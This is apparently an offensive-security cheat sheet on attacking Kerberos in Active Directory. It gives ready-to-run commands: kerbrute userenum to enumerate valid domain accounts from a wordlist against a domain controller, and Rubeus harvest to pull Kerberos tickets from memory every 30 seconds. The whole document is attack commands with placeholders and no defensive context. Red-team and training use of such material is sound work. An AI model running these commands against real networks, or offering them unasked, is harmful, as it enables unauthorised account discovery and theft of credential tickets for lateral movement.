# Kerberos

#### Enumerating users

```bash
./kerbrute userenum --dc <DC> -d <DOMAIN> <USERNAME_WORDLIST_FILENAME>
```

#### Harvesting tickets

* **Rubeus** (every 30 seconds):

```powershell
.\Rubeus.exe harvest /interval:30
```
